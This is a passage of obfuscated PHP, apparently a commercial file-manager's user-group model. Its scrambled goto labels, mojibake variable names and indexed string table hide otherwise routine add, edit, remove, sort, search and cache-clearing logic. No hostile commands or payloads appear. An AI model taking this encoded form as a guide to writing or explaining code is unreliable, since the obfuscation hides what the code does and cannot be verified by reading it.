= $this->getInfoSimple($A‹°¿ÁìÆ¨[$aá™±·‰Ê[472]]); if (!$B¹„¶È—Îè) { return !1; } } $dèãÊÃËˆ• = $aá™±·‰Ê[493]; goto BŒñ¥Í£µ; BŒñ¥Í£µ: if ($B¹„¶È—Îè[$aá™±·‰Ê[481]]) { $dèãÊÃËˆ• = $B¹„¶È—Îè[$aá™±·‰Ê[481]] . $B¹„¶È—Îè[$aá™±·‰Ê[1674]] . $aá™±·‰Ê[47]; } $Aí‚˜Ê¯ˆ‚ = array($aá™±·‰Ê[407] => $this->groupNameAuto($A‹°¿ÁìÆ¨[$aá™±·‰Ê[472]], $A‹°¿ÁìÆ¨[$aá™±·‰Ê[28]]), $aá™±·‰Ê[389] => $A‹°¿ÁìÆ¨[$aá™±·‰Ê[472]], $aá™±·‰Ê[548] => $dèãÊÃËˆ•, $aá™±·‰Ê[1749] => $A‹°¿ÁìÆ¨[$aá™±·‰Ê[1658]], $aá™±·‰Ê[1750] => 0, $aá™±·‰Ê[1678] => 0); if (isset($A‹°¿ÁìÆ¨[$aá™±·‰Ê[1697]])) { $Aí‚˜Ê¯ˆ‚[$aá™±·‰Ê[1697]] = $A‹°¿ÁìÆ¨[$aá™±·‰Ê[1697]]; } else { $Bµ³ˆ‘ÀøÇ = $this->max($aá™±·‰Ê[1697]); if (!$Bµ³ˆ‘ÀøÇ) { $Bµ³ˆ‘ÀøÇ = 0; } $Aí‚˜Ê¯ˆ‚[$aá™±·‰Ê[1697]] = $Bµ³ˆ‘ÀøÇ + 1; } goto AæÄ„¿ƒÔ; CÓˆ¸Å©õ: if (isset($A‹°¿ÁìÆ¨[$aá™±·‰Ê[1751]])) { $this->metaSet($E´”ğŸ„§®, array($aá™±·‰Ê[1751] => $A‹°¿ÁìÆ¨[$aá™±·‰Ê[1751]], $aá™±·‰Ê[1752] => $A‹°¿ÁìÆ¨[$aá™±·‰Ê[1752]])); unset($A‹°¿ÁìÆ¨[$aá™±·‰Ê[1751]]); unset($A‹°¿ÁìÆ¨[$aá™±·‰Ê[1752]]); } Model($aá™±·‰Ê[1186])->groupRootAdd($E´”ğŸ„§®); return $E´”ğŸ„§®; goto bõµå´‚î¦; AæÄ„¿ƒÔ: if (!empty($A‹°¿ÁìÆ¨[$aá™±·‰Ê[1674]])) { $Aí‚˜Ê¯ˆ‚[$aá™±·‰Ê[1674]] = $A‹°¿ÁìÆ¨[$aá™±·‰Ê[1674]]; } $E´”ğŸ„§® = $this->add($Aí‚˜Ê¯ˆ‚); $this->setNamePinyin($E´”ğŸ„§®, $Aí‚˜Ê¯ˆ‚[$aá™±·‰Ê[28]]); goto CÓˆ¸Å©õ; bõµå´‚î¦: } protected function groupEdit($eã¶ÜŠ ¼µ, $fç…Ù¬§Ê) { goto A¬ÄÓ±øğÓ; dÇ•§êƒÈ°: if (isset($fç…Ù¬§Ê[$eÛÚ« …ë¨[28]]) && $fç…Ù¬§Ê[$eÛÚ« …ë¨[28]] != $d¿¯¯ˆğ¼[$eÛÚ« …ë¨[28]]) { $this->_clearChildrenCache($d¿¯¯ˆğ¼); } return $this->where(array($eÛÚ« …ë¨[1753] => $eã¶ÜŠ ¼µ))->save($fç…Ù¬§Ê); goto D¿¿ù°¥ì; f¿¤¢Øˆ™: if (!empty($fç…Ù¬§Ê[$eÛÚ« …ë¨[472]])) { $b‹•¤‹éµ§ = $this->getInfoSimple($fç…Ù¬§Ê[$eÛÚ« …ë¨[472]]); if (!$b‹•¤‹éµ§) { return !1; } if ($d¿¯¯ˆğ¼[$eÛÚ« …ë¨[1674]] == $b‹•¤‹éµ§[$eÛÚ« …ë¨[1674]]) { return !1; } if ($fç…Ù¬§Ê[$eÛÚ« …ë¨[472]] != $d¿¯¯ˆğ¼[$eÛÚ« …ë¨[472]]) { if ($b‹•¤‹éµ§[$eÛÚ« …ë¨[481]] !== $d¿¯¯ˆğ¼[$eÛÚ« …ë¨[481]] && strpos($b‹•¤‹éµ§[$eÛÚ« …ë¨[481]], $d¿¯¯ˆğ¼[$eÛÚ« …ë¨[481]] . $d¿¯¯ˆğ¼[$eÛÚ« …ë¨[1674]] . $eÛÚ« …ë¨[47]) === 0) { return !1; } $fç…Ù¬§Ê[$eÛÚ« …ë¨[548]] = $b‹•¤‹éµ§[$eÛÚ« …ë¨[481]] . $fç…Ù¬§Ê[$eÛÚ« …ë¨[472]] . $eÛÚ« …ë¨[47]; $this->_changeChildLevel($d¿¯¯ˆğ¼, $b‹•¤‹éµ§); } } if (isset($fç…Ù¬§Ê[$eÛÚ« …ë¨[28]])) { $this->setNamePinyin($eã¶ÜŠ ¼µ, $fç…Ù¬§Ê[$eÛÚ« …ë¨[28]]); } if (isset($fç…Ù¬§Ê[$eÛÚ« …ë¨[1751]])) { $this->metaSet($eã¶ÜŠ ¼µ, array($eÛÚ« …ë¨[1751] => $fç…Ù¬§Ê[$eÛÚ« …ë¨[1751]], $eÛÚ« …ë¨[1752] => $fç…Ù¬§Ê[$eÛÚ« …ë¨[1752]])); unset($fç…Ù¬§Ê[$eÛÚ« …ë¨[1751]]); unset($fç…Ù¬§Ê[$eÛÚ« …ë¨[1752]]); } goto dÇ•§êƒÈ°; A¬ÄÓ±øğÓ: $eÛÚ« …ë¨ =& $_SERVER[ÉóçÄÇ]; $d¿¯¯ˆğ¼ = $this->getInfoSimple($eã¶ÜŠ ¼µ); if (!$d¿¯¯ˆğ¼) { return !1; } goto f¿¤¢Øˆ™; D¿¿ù°¥ì: } private function _clearChildrenCache($c¡¡—Óùß) { $Dè¦»£ç†¯ =& $_SERVER[ÉóçÄÇ]; $DÕœâ÷½Åã = array($Dè¦»£ç†¯[548] => array($Dè¦»£ç†¯[507], $c¡¡—Óùß[$Dè¦»£ç†¯[481]] . $c¡¡—Óùß[$Dè¦»£ç†¯[1674]] . $Dè¦»£ç†¯[508])); $Cİ‡§áŸ§ = $this->field($Dè¦»£ç†¯[1674])->where($DÕœâ÷½Åã)->select(); foreach ($Cİ‡§áŸ§ as $dåàÓ¥ÍæÊ) { $this->cacheFunctionClear($Dè¦»£ç†¯[1754], $dåàÓ¥ÍæÊ[$Dè¦»£ç†¯[1674]]); $this->cacheFunctionClear($Dè¦»£ç†¯[1748], $dåàÓ¥ÍæÊ[$Dè¦»£ç†¯[1674]]); } } private function _changeChildLevel($c†©µƒÙØ , $bŞ±Î¸Ùš, $B“³×ğŠÚ = false) { goto AÒ‹ İ†ê‡; D‘†áÂ¥©: $this->_clearChildrenCache($c†©µƒÙØ ); $this->where($bÇ‹¶¹íÄ)->data($e÷éÅ´¡ö )->save(); goto F£²èïôÃ½; E‰‡ÌÛÓ¯: if ($B“³×ğŠÚ) { $DÙËïº¬Í° = $bŞ±Î¸Ùš[$aö•‰Éª¸[481]] . $bŞ±Î¸Ùš[$aö•‰Éª¸[1674]] . $aö•‰Éª¸[47]; } $bÇ‹¶¹íÄ = array($aö•‰Éª¸[548] => array($aö•‰Éª¸[507], $c†©µƒÙØ [$aö•‰Éª¸[481]] . $c†©µƒÙØ [$aö•‰Éª¸[1674]] . $aö•‰Éª¸[508])); $e÷éÅ´¡ö  = array($aö•‰Éª¸[548] => array($aö•‰Éª¸[556], "\162\x65\x70\x6c\x61\143\145\50\x70\x61\x72\x65\x6e\x74\114\x65\166\145\154\54\x27{$BÓÃÅ¡Æ‡}\x27\x2c\x27{$DÙËïº¬Í°}\x27\51")); goto D‘†áÂ¥©; AÒ‹ İ†ê‡: $aö•‰Éª¸ =& $_SERVER[ÉóçÄÇ]; $BÓÃÅ¡Æ‡ = $c†©µƒÙØ [$aö•‰Éª¸[481]] . $c†©µƒÙØ [$aö•‰Éª¸[1674]] . $aö•‰Éª¸[47]; $DÙËïº¬Í° = $bŞ±Î¸Ùš[$aö•‰Éª¸[481]] . $bŞ±Î¸Ùš[$aö•‰Éª¸[1674]] . $aö•‰Éª¸[47] . $c†©µƒÙØ [$aö•‰Éª¸[1674]] . $aö•‰Éª¸[47]; goto E‰‡ÌÛÓ¯; F£²èïôÃ½: } public function setNamePinyin($cˆÜÛñÂ¿, $E¥ö—á‚¬ = false) { $A«ã  ›ïİ =& $_SERVER[ÉóçÄÇ]; if (!$E¥ö—á‚¬) { $dÔé‘×à·‹ = $this->getInfoSimple($cˆÜÛñÂ¿); $E¥ö—á‚¬ = $dÔé‘×à·‹[$A«ã  ›ïİ[28]]; } if (!Input::check($E¥ö—á‚¬, $A«ã  ›ïİ[551])) { $this->metaSet($cˆÜÛñÂ¿, $A«ã  ›ïİ[438], null); $this->metaSet($cˆÜÛñÂ¿, $A«ã  ›ïİ[437], null); return; } $eòâ§ç– = array($A«ã  ›ïİ[438] => str_replace($A«ã  ›ïİ[50], $A«ã  ›ïİ[33], Pinyin::encode($E¥ö—á‚¬)), $A«ã  ›ïİ[437] => Pinyin::encode($E¥ö—á‚¬, $A«ã  ›ïİ[552])); $this->metaSet($cˆÜÛñÂ¿, $eòâ§ç–); } protected function groupStatus($e”­„‰Éí, $EŒˆî³®ô) { goto e‘ö¥Ê¤²Ú; e‘ö¥Ê¤²Ú: $c÷­¯‡Õ =& $_SERVER[ÉóçÄÇ]; $bñã£¬êß = $this->getInfoSimple($e”­„‰Éí); if (!$bñã£¬êß) { return !1; } goto E¹‘µØèÁÏ; D›‚¡Ö» : foreach ($FâŞÁ˜À—¯ as $e”­„‰Éí) { $B¡•ÙŒ¨[] = array($c÷­¯‡Õ[1674] => $e”­„‰Éí, $c÷­¯‡Õ[92] => $c÷­¯‡Õ[711], $c÷­¯‡Õ[370] => $EŒˆî³®ô); } return Model($c÷­¯‡Õ[1755])->addAll($B¡•ÙŒ¨, array(), !0); goto dÃ¨ãà“½; E¹‘µØèÁÏ: if ($EŒˆî³®ô == $c÷­¯‡Õ[86]) { $FâŞÁ˜À—¯ = $this->parentLevelArray($bñã£¬êß[$c÷­¯‡Õ[481]]); } else { $c´·µëÔ‡ò = array($c÷­¯‡Õ[548] => array($c÷­¯‡Õ[507], $bñã£¬êß[$c÷­¯‡Õ[481]] . $bñã£¬êß[$c÷­¯‡Õ[1674]] . $c÷­¯‡Õ[508])); $FâŞÁ˜À—¯ = $this->where($c´·µëÔ‡ò)->field($c÷­¯‡Õ[1674])->select(); $FâŞÁ˜À—¯ = array_to_keyvalue($FâŞÁ˜À—¯, $c÷­¯‡Õ[33], $c÷­¯‡Õ[1674]); } $FâŞÁ˜À—¯[] = $bñã£¬êß[$c÷­¯‡Õ[1674]]; $B¡•ÙŒ¨ = array(); goto D›‚¡Ö» ; dÃ¨ãà“½: } protected function groupRemove($cùäº”ë‡¡) { goto e³‹ªëÒƒ; BÆÆÜ™Ö—­: $this->where(array($d‹áÆ²•Í[472] => $cùäº”ë‡¡))->save(array($d‹áÆ²•Í[472] => $fá×˜³ì„[$d‹áÆ²•Í[472]])); Model($d‹áÆ²•Í[1755])->where($E¤£ÑÏàÁÒ)->delete(); Model($d‹áÆ²•Í[1756])->where($E¤£ÑÏàÁÒ)->delete(); goto bºŒ‡‹»; e³‹ªëÒƒ: $d‹áÆ²•Í =& $_SERVER[ÉóçÄÇ]; $E¤£ÑÏàÁÒ = array($d‹áÆ²•Í[1674] => $cùäº”ë‡¡); $fá×˜³ì„ = $this->where($E¤£ÑÏàÁÒ)->find(); goto eË¡×ÖŒ°í; bºŒ‡‹»: Model($d‹áÆ²•Í[776])->groupRootRemove($cùäº”ë‡¡); return $this->where($E¤£ÑÏàÁÒ)->delete(); goto eÔõ¸£´çø; eË¡×ÖŒ°í: if (!$fá×˜³ì„ || $fá×˜³ì„[$d‹áÆ²•Í[472]] == 0) { return !1; } $Dø¹…¼¿Ëœ = $this->getInfoSimple($fá×˜³ì„[$d‹áÆ²•Í[472]]); $this->_changeChildLevel($fá×˜³ì„, $Dø¹…¼¿Ëœ, !0); goto BÆÆÜ™Ö—­; eÔõ¸£´çø: } protected function groupSort($aéƒ«áÊ¾©) { $bº‘Ë‹ó× =& $_SERVER[ÉóçÄÇ]; $bµÀÅÇ©´ = array(); foreach ($aéƒ«áÊ¾© as $d›˜ŒŠÓèò => $cƒáçª«¬ô) { $bµÀÅÇ©´[] = array($bº‘Ë‹ó×[1674], $cƒáçª«¬ô, $bº‘Ë‹ó×[1697], $d›˜ŒŠÓèò + 1); } $this->saveAll($bµÀÅÇ©´); } public function listData() { $a’à¼É¨ÏÍ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($a’à¼É¨ÏÍ[$_SERVER[ÉóçÄÇ][365]]); return $a’à¼É¨ÏÍ; } private function _makeOrder($EĞöç “ˆø = '') { goto D¸‡ªŸï‘ø; c¼Õè·˜º: $EĞöç “ˆø = $EĞöç “ˆø . "{$eæîÕÄÕÉ}\x20{$AÇ´óŠéâ¢}\x2c\x20\147\162\x6f\x75\x70\x49\x44\x20\141\x73\x63"; return $this->order($EĞöç “ˆø); goto aÃÂâÈ÷œª; D¸‡ªŸï‘ø: $E°‚ÕÚæªÙ =& $_SERVER[ÉóçÄÇ]; $CÎ’Éœ¤¬ˆ = array($E°‚ÕÚæªÙ[1674], $E°‚ÕÚæªÙ[28], $E°‚ÕÚæªÙ[1660], $E°‚ÕÚæªÙ[192]); $Bƒ˜µåĞ‹© = array($E°‚ÕÚæªÙ[422] => $E°‚ÕÚæªÙ[423], $E°‚ÕÚæªÙ[424] => $E°‚ÕÚæªÙ[425]); goto BĞ…÷İì¹©; BĞ…÷İì¹©: $eæîÕÄÕÉ = Input::get($E°‚ÕÚæªÙ[429], $E°‚ÕÚæªÙ[7], $E°‚ÕÚæªÙ[1678], $CÎ’Éœ¤¬ˆ); $AÇ´óŠéâ¢ = Input::get($E°‚ÕÚæªÙ[430], $E°‚ÕÚæªÙ[7], $E°‚ÕÚæªÙ[1757], array($E°‚ÕÚæªÙ[1757], $E°‚ÕÚæªÙ[424])); $AÇ´óŠéâ¢ = $Bƒ˜µåĞ‹©[$AÇ´óŠéâ¢]; goto c¼Õè·˜º; aÃÂâÈ÷œª: } public function listChild($A°‡ˆº÷†) { $F¡ŠÁß•ÌŠ =& $_SERVER[ÉóçÄÇ]; $D‰ç’’œ× = $this->where(array($F¡ŠÁß•ÌŠ[472] => $A°‡ˆº÷†))->_makeOrder()->selectPage(200); $this->_listDataApply($D‰ç’’œ×[$F¡ŠÁß•ÌŠ[365]]); return $D‰ç’’œ×; } public function listByID($dÆ‚µËˆâñ) { $cè”¶ÜäØç =& $_SERVER[ÉóçÄÇ]; if (!$dÆ‚µËˆâñ) { return array(); } $d¿Àªáâ = array($cè”¶ÜäØç[1674] => array($cè”¶ÜäØç[7], $dÆ‚µËˆâñ)); $b®ŠŸ‰ĞÛ = $this->where($d¿Àªáâ)->select(); $this->_listDataApply($b®ŠŸ‰ĞÛ); return $b®ŠŸ‰ĞÛ; } public function listSearch($CõÛ°óô—) { goto b±¯×¦Ûô÷; F‰Ú°»¤: $eÇ®Û‹ÂÎ = $eÇ®Û‹ÂÎ ? $eÇ®Û‹ÂÎ : array(); if (!$eÇ®Û‹ÂÎ || count($eÇ®Û‹ÂÎ[$Dìî­Üª§˜[365]]) < 5 && Input::check($B¿Š®¬°êÒ, $Dìî­Üª§˜[314])) { goto CßÈÌÑÏ·; bŒŸ®·×Š¢: $EˆË™ù•É = array_merge($A˜ÕŠ•ïÍ, $Fä²à‡‡ò, $eÇ®Û‹ÂÎ[$Dìî­Üª§˜[365]]); $eÇ®Û‹ÂÎ[$Dìî­Üª§˜[365]] = array_unique_by_key($EˆË™ù•É, $Dìî­Üª§˜[1674]); $eÇ®Û‹ÂÎ[$Dìî­Üª§˜[362]][$Dìî­Üª§˜[363]] = count($eÇ®Û‹ÂÎ[$Dìî­Üª§˜[365]]); goto d«ÖÒ°Õ¢ ; CßÈÌÑÏ·: $fµÕŒ‹µ£ = $this->groupChildrenAll($DÀ×¹ä‚´); $A˜ÕŠ•ïÍ = $this->_searchFromMeta($Dìî­Üª§˜[437], $B¿Š®¬°êÒ, 10, $fµÕŒ‹µ£); $Fä²à‡‡ò = $this->_searchFromMeta($Dìî­Üª§˜[438], $B¿Š®¬°êÒ, 10, $fµÕŒ‹µ£); goto bŒŸ®·×Š¢; d«ÖÒ°Õ¢ : $eÇ®Û‹ÂÎ[$Dìî­Üª§˜[362]][$Dìî­Üª§˜[364]] = ceil($eÇ®Û‹ÂÎ[$Dìî­Üª§˜[362]][$Dìî­Üª§˜[363]] / $eÇ®Û‹ÂÎ[$Dìî­Üª§˜[362]][$Dìî­Üª§˜[359]]); goto eŞÇÌğÏÊİ; eŞÇÌğÏÊİ: } $this->_listDataApply($eÇ®Û‹ÂÎ[$Dìî­Üª§˜[365]]); goto Fñ˜âî‹‹; Fñ˜âî‹‹: return $eÇ®Û‹ÂÎ; goto a•—µ¬…à²; b±¯×¦Ûô÷: $Dìî­Üª§˜ =& $_SERVER[ÉóçÄÇ]; $B¿Š®¬°êÒ = $CõÛ°óô—[$Dìî­Üª§˜[1758]]; $DÀ×¹ä‚´ = isset($CõÛ°óô—[$Dìî­Üª§˜[1759]]) ? $CõÛ°óô—[$Dìî­Üª§˜[1759]] : !1; goto EÇ‡éâˆ˜; EÇ‡éâˆ˜: if (!trim($B¿Š®¬°êÒ)) { return !1; } $B¿Š®¬°êÒ = str_replace($Dìî­Üª§˜[1760], $Dìî­Üª§˜[1761], $B¿Š®¬°êÒ); $C†ÕäçŸáæ = array($Dìî­Üª§˜[1674] => array($Dìî­Üª§˜[378], "{$B¿Š®¬°êÒ}\x25"), $Dìî­Üª§˜[28] => array($Dìî­Üª§˜[378], "\45{$B¿Š®¬°êÒ}\x25"), $Dìî­Üª§˜[939] => $Dìî­Üª§˜[1762]); goto eÄ‡º…š²Ú; eÄ‡º…š²Ú: if ($DÀ×¹ä‚´) { $fçíÌÃÔ‡½ = $this->getInfoSimple($DÀ×¹ä‚´); $F×…ŞÃµ• = $fçíÌÃÔ‡½[$Dìî­Üª§˜[481]] . $DÀ×¹ä‚´ . $Dìî­Üª§˜[508]; $C†ÕäçŸáæ = array($C†ÕäçŸáæ, array($Dìî­Üª§˜[481] => array($Dìî­Üª§˜[378], $F×…ŞÃµ•))); } $C†ÕäçŸáæ = $this->parseWhereLike($C†ÕäçŸáæ); $eÇ®Û‹ÂÎ = $this->_makeOrder()->where($C†ÕäçŸáæ)->selectPage(20); goto F‰Ú°»¤; a•—µ¬…à²: } protected function groupChildrenAll($cÓ¯ƒ‘Ÿ¿©) { $F¥íåµ =& $_SERVER[ÉóçÄÇ]; if (!$cÓ¯ƒ‘Ÿ¿©) { return !1; } if (is_string($cÓ¯ƒ‘Ÿ¿©)) { $cÓ¯ƒ‘Ÿ¿© = array($cÓ¯ƒ‘Ÿ¿©); } $FŞã×–Á = $cÓ¯ƒ‘Ÿ¿©; foreach ($cÓ¯ƒ‘Ÿ¿© as $e¶òï‡á÷) { $F©Äæö†ØÖ = $this->getInfoSimple($e¶òï‡á÷); $BÓíô…£×§ = array($F¥íåµ[481] => array($F¥íåµ[378], $F©Äæö†ØÖ[$F¥íåµ[481]] . $e¶òï‡á÷ . $F¥íåµ[508])); $B—»˜®± Â = $this->field($F¥íåµ[1674])->where($BÓíô…£×§)->select(); $FŞã×–Á = array_merge($FŞã×–Á, array_to_keyvalue($B—»˜®± Â, $F¥íåµ[33], $F¥íåµ[1674])); } return array_unique($FŞã×–Á); } private function _searchFromMeta($eŠ¤÷ÕÇß¯, $cğ›»ˆíØ, $Fò†ñ„«£Ì, $EÕğ˜²±÷’) { goto b”ğĞ¡Ÿ; d¥ÓŞ”Üåô: $EÁâ¬²×—è = $this->parseWhereLike($EÁâ¬²×—è); if ($EÕğ˜²±÷’) { $EÁâ¬²×—è[$F´ô³È®ß­[1674]] = array($F´ô³È®ß­[7], $EÕğ˜²±÷’); } $fÍ¾ˆš“š = Model($F´ô³È®ß­[1763])->where($EÁâ¬²×—è)->limit($Fò†ñ„«£Ì)->select(); goto EõÛÃˆö¼; b”ğĞ¡Ÿ: $F´ô³È®ß­ =& $_SERVER[ÉóçÄÇ]; $cğ›»ˆíØ = strtolower($cğ›»ˆíØ); $EÁâ¬²×—è = array($F´ô³È®ß­[92] => $eŠ¤÷ÕÇß¯, $F´ô³È®ß­[370] => array($F´ô³È®ß­[378], "\45{$cğ›»ˆíØ}\45")); goto d¥ÓŞ”Üåô; B²¥Ä “ª: if (!$dç¶”¼„÷á) { return array(); } return $dç¶”¼„÷á; goto f¤·©õÚóŸ; EõÛÃˆö¼: if (!$fÍ¾ˆš“š) { return array(); } $fÍ¾ˆš“š = array_to_keyvalue($fÍ¾ˆš“š, $F´ô³È®ß­[33], $F´ô³È®ß­[1674]); $dç¶”¼„÷á = $this->where(array($F´ô³È®ß­[1753] => array($F´ô³È®ß­[7], $fÍ¾ˆš“š)))->select(); goto B²¥Ä “ª; f¤·©õÚóŸ: } protected function _listDataApplyItem($c¤Û˜Åˆ±×) { $aá©å±‡®â = array($c¤Û˜Åˆ±×); $this->_listDataApply($aá©å±‡®â); return $aá©å±‡®â[0]; } protected function _listDataApply(&$B©ƒÆÖåó) { goto DœŒ¿àÁøÅ; cŞÉ°£–…: $this->_listAppendParent($B©ƒÆÖåó); $this->_listAppendSourceRoot($B©ƒÆÖåó, $D·…³Õ•òÄ); goto AŞŞÜíßˆ; DœŒ¿àÁøÅ: $f §±íë‹† =& $_SERVER[ÉóçÄÇ]; if (!$B©ƒÆÖåó) { return; } $D·…³Õ•òÄ = array_to_keyvalue($B©ƒÆÖåó, $f §±íë‹†[33], $f §±íë‹†[1674]); goto a¹·„ˆÓ¼ì; a¹·„ˆÓ¼ì: $this->_listAppendChildren($B©ƒÆÖåó); $this->_listAppendChildrenMember($B©ƒÆÖåó); $this->_listAppendMeta($B©ƒÆÖåó, $D·…³Õ•òÄ); goto cŞÉ°£–…; AŞŞÜíßˆ: } private function _listAppendChildren(&$e˜ ‘Ñ›ß©) { goto Aà®”‘•àÛ; B®‡§áË÷: foreach ($e˜ ‘Ñ›ß© as &$B½îğÙÛÏÀ) { $bÕÇ²™Íˆ = $B½îğÙÛÏÀ[$f¬¥¥¥Óâ—[1674]]; $B½îğÙÛÏÀ[$f¬¥¥¥Óâ—[1765]] = isset($A„¼óã¯ªº[$bÕÇ²™Íˆ]) ? intval($A„¼óã¯ªº[$bÕÇ²™Íˆ]) : !1; } unset($B½îğÙÛÏÀ); goto Aê’‡¢Şé¼; Aà®”‘•àÛ: $f¬¥¥¥Óâ— =& $_SERVER[ÉóçÄÇ]; $aÇ”óà¼Øö = array_to_keyvalue($e˜ ‘Ñ›ß©, $f¬¥¥¥Óâ—[33], $f¬¥¥¥Óâ—[1674]); $dŠÖ¦ÑÑ™ = array($f¬¥¥¥Óâ—[472] => array($f¬¥¥¥Óâ—[7], $aÇ”óà¼Øö)); goto dºÀÑ¤Ûã·; dºÀÑ¤Ûã·: $a‰‡Û‚Ç‘È = array($f¬¥¥¥Óâ—[472], $f¬¥¥¥Óâ—[1764] => $f¬¥¥¥Óâ—[474]); $B¢øôº‰ÔÄ = $this->field($a‰‡Û‚Ç‘È)->where($dŠÖ¦ÑÑ™)->group($f¬¥¥¥Óâ—[472])->select(); $A„¼óã¯ªº = array_to_keyvalue($B¢øôº‰ÔÄ, $f¬¥¥¥Óâ—[472], $f¬¥¥¥Óâ—[474]); goto B®‡§áË÷; Aê’‡¢Şé¼: } private function _listAppendChildrenMember(&$c‚¸¤Ùßí) { goto eæéà¥‚É; d–ÅÆ’ùÇ: foreach ($c‚¸¤Ùßí as &$EË¿·µÙº¾) { $eóÕËëêçá = $EË¿·µÙº¾[$e«ç«­¸à[1674]]; $EË¿·µÙº¾[$e«ç«­¸à[1766]] = isset($c—·Î˜º±ô[$eóÕËëêçá]) ? intval($c—·Î˜º±ô[$eóÕËëêçá]) : !1; } unset($EË¿·µÙº¾); goto dÊ°ª“†—; eæéà¥‚É: $e«ç«­¸à =& $_SERVER[ÉóçÄÇ]; $b†š±µôšŸ = array_to_keyvalue($c‚¸¤Ùßí, $e«ç«­¸à[33], $e«ç«­¸à[1674]); $få†Ã¹«öÊ = array($e«ç«­¸à[1674] => array($e«ç«­¸à[7], $b†š±µôšŸ)); goto cöÁ¥©©Ø; cöÁ¥©©Ø: $dãâÔ³ˆŞ = array($e«ç«­¸à[1674], $e«ç«­¸à[1764] => $e«ç«­¸à[474]); $D¤İó¹»¡ˆ = Model($e«ç«­¸à[1756])->field($dãâÔ³ˆŞ)->where($få†Ã¹«öÊ)->group($e«ç«­¸à[1674])->select(); $c—·Î˜º±ô = array_to_keyvalue($D¤İó¹»¡ˆ, $e«ç«­¸à[1674], $e«ç«­¸à[474]); goto d–ÅÆ’ùÇ; dÊ°ª“†—: } private function _listAppendMeta(&$fÕ¤Û­İ, $E¨‰ã“Å) { goto d±Â”¿¨ğã; a‡³Ô…÷ğ: foreach ($fÕ¤Û­İ as &$eŸß…ô·¡) { $eŸß…ô·¡[$A±½âöéÂ£[439]] = array(); if (isset($CàÕì„ÇíÃ[$eŸß…ô·¡[$A±½âöéÂ£[1674]]])) { $eŸß…ô·¡[$A±½âöéÂ£[439]] = $CàÕì„ÇíÃ[$eŸß…ô·¡[$A±½âöéÂ£[1674]]]; } } unset($eŸß…ô·¡); goto Dˆ‚ãöò›; d±Â”¿¨ğã: $A±½âöéÂ£ =& $_SERVER[ÉóçÄÇ]; $F³Ÿò¿¼ò = array($A±½âöéÂ£[1674] => array($A±½âöéÂ£[7], $E¨‰ã“Å)); $CàÕì„ÇíÃ = Model($A±½âöéÂ£[1755])->where($F³Ÿò¿¼ò)->select(); goto báŸ†—ÔË; báŸ†—ÔË: $CàÕì„ÇíÃ = array_to_keyvalue_group($CàÕì„ÇíÃ, $A±½âöéÂ£[1674]); foreach ($CàÕì„ÇíÃ as &$eÆ«ÃºÎ¥–) { $eÆ«ÃºÎ¥– = array_to_keyvalue($eÆ«ÃºÎ¥–, $A±½âöéÂ£[92], $A±½âöéÂ£[370]); } unset($eÆ«ÃºÎ¥–); goto a‡³Ô…÷ğ; Dˆ‚ãöò›: } protected function parentLevelArray($A”ÛÉ¤×«ù) { $aÛ’×Ê =& $_SERVER[ÉóçÄÇ]; $A”ÛÉ¤×«ù = explode($aÛ’×Ê[47], trim($A”ÛÉ¤×«ù, $aÛ’×Ê[47])); $A”ÛÉ¤×«ù = array_remove_value($A”ÛÉ¤×«ù, $aÛ’×Ê[491]); return $A”ÛÉ¤×«ù; } private function _listAppendParent(&$e¤÷‡…Ò³´) { goto DÖó±‚óèÁ; a°Ÿ¢®Ğ»õ: foreach ($e¤÷‡…Ò³´ as &$f‚§“ÊéƒÖ) { $Bç¤Â˜ÓÁï = $this->parentLevelArray($f‚§“ÊéƒÖ[$DšäŸÁÛãï[481]]); $a¹¼—Å–áÀ = $DšäŸÁÛãï[33]; foreach ($Bç¤Â˜ÓÁï as $FñŒàßÚß => $bí»ÉãÌ¢) { if ($DÚ¼„£©Ñ && $FñŒàßÚß == 0) { continue; } $a¹¼—Å–áÀ .= $aŒêÕäš‘‚[$bí»ÉãÌ¢] . $DšäŸÁÛãï[8]; } if ($Bç¤Â˜ÓÁï) { $a¹¼—Å–áÀ .= $f‚§“ÊéƒÖ[$DšäŸÁÛãï[28]]; } $f‚§“ÊéƒÖ[$DšäŸÁÛãï[485]] = str_replace($DšäŸÁÛãï[490], $DšäŸÁÛãï[8], $a¹¼—Å–áÀ); } unset($f‚§“ÊéƒÖ); goto D‰ã…¯³¶Š; E‹›Å¬Ö‹í: unset($f‚§“ÊéƒÖ); foreach ($aŒêÕäš‘‚ as $FñŒàßÚß => $D„Ä¯Üï´­) { if ($D„Ä¯Üï´­) { continue; } $C®¾çÁöÃø = $this->getInfoSimple($FñŒàßÚß); $aŒêÕäš‘‚[$FñŒàßÚß] = $C®¾çÁöÃø[$DšäŸÁÛãï[28]]; } $DÚ¼„£©Ñ = $GLOBALS[$DšäŸÁÛãï[6]][$DšäŸÁÛãï[87]][$DšäŸÁÛãï[1767]]; goto a°Ÿ¢®Ğ»õ; DÖó±‚óèÁ: $DšäŸÁÛãï =& $_SERVER[ÉóçÄÇ]; $aŒêÕäš‘‚ = array(); foreach ($e¤÷‡…Ò³´ as &$f‚§“ÊéƒÖ) { $aŒêÕäš‘‚[$f‚§“ÊéƒÖ[$DšäŸÁÛãï[1674]]] = $f‚§“ÊéƒÖ[$DšäŸÁÛãï[28]]; $Bç¤Â˜ÓÁï = $this->parentLevelArray($f‚§“ÊéƒÖ[$DšäŸÁÛãï[481]]); foreach ($Bç¤Â˜ÓÁï as $bí»ÉãÌ¢) { if (!isset($aŒêÕäš‘‚[$bí»ÉãÌ¢])) { $aŒêÕäš‘‚[$bí»ÉãÌ¢] = 0; } } } goto E‹›Å¬Ö‹í; D‰ã…¯³¶Š: } private function _listAppendSourceRoot(&$C—°Ç±Üèä, $bŠçŠä—¡Ç) { goto C”—¡Î®æš; C”—¡Î®æš: $c¬‹Š²¾Øë =& $_SERVER[ÉóçÄÇ]; $C‡œÕëêÆ = array($c¬‹Š²¾Øë[398] => SourceModel::TYPE_GROUP, $c¬‹Š²¾Øë[472] => 0, $c¬‹Š²¾Øë[478] => array($c¬‹Š²¾Øë[7], $bŠçŠä—¡Ç)); $BÇœìÖ“æÈ = $c¬‹Š²¾Øë[1768]; goto Eƒª‘èˆ££; Eƒª‘èˆ££: $fùğƒŠê—õ = Model($c¬‹Š²¾Øë[776])->order($c¬‹Š²¾Øë[1769])->field($BÇœìÖ“æÈ)->where($C‡œÕëêÆ)->select(); $fùğƒŠê—õ = array_to_keyvalue($fùğƒŠê—õ, $c¬‹Š²¾Øë[478]); $fùğƒŠê—õ = array_remove_key($fùğƒŠê—õ, $c¬‹Š²¾Øë[478]); goto 